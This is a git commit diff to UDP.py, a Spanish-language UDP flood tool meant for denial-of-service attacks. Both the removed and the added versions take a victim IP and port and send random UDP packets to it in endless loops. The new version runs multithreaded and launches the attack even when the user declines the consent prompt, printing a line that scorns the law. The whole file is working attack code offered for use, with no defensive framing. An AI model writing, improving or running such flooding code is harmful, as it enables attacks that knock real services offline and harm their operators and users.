07710ab5c087ec2e6a38ea05d440ce4ca99b745f
GhostyCeh <41862824+GhostyCeh@users.noreply.github.com>
2020-01-08 10:59:39 -0600

    Update UDP.py

--- UDP.py
+++ UDP.py
@@ -1,48 +1,29 @@
-import os
-import time
 import random
 import socket
-import requests
 import threading
-import cfscrape
-import colorama
-from colorama import *
 
-def main():
-        global victima
-        global port
-        global tiempo1
-        os.system("cls || clear")
-        victima = raw_input("- Victima: ")
-        port = int(input("- Puerto: "))
-        tiempo1 = int(input("- Tiempo De Ataque (Segundos): "))
-        os.system("cls || clear")
-        UDP()
+ip = str(input(" IP - "))
+puerto = int(input(" Puerto - "))
+times = int(input(" Paquetes - "))
+threads = int(input(" Conexiones - "))
+choice = str(input(" El ataque es bajo tu responsabilidad, estas de acuerdo?: y/n"))
+def udpddos():
+	data = random._urandom(1024)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(puerto))
+			for x in range(times):
+				s.sendto(data,addr)
+			print("[LPTool] Ataque exitoso")
+		except:
+			print("[LPTool] Algun error ha ocurrido, revise el codigo!")
 
-def UDP():
-    count = 0
-    puertoo = port
-    randport=(True,False)[port==0]
-    ip = victima
-    dur = tiempo1
-    tiempo=(lambda:0,time.clock)[dur>0]
-    tiempotion=(1,(tiempo()+dur))[dur>0]
-    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-    bytes=random._urandom(15000)
-    os.system("cls || clear")
-    print('- Empezando Ataque -')
-    while True:
-        puertoo=(random.randint(1,15000000),puertoo)[randport]
-        if tiempo()<tiempotion:
-	    count = count + 1
-            sock.sendto(bytes,(ip,puertoo))
-	    print("Paquete #" + str(count))
-        else:
-            break
-    os.system("cls || clear")
-    print('Ataque Finalizado!')
-    main()
-
-
-if __name__ == "__main__":
-	main()
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = udpddos)
+		th.start()
+	else:
+		print("We don't give a fuck about laws")
+		th = threading.Thread(target = udpddos)
+		th.start()
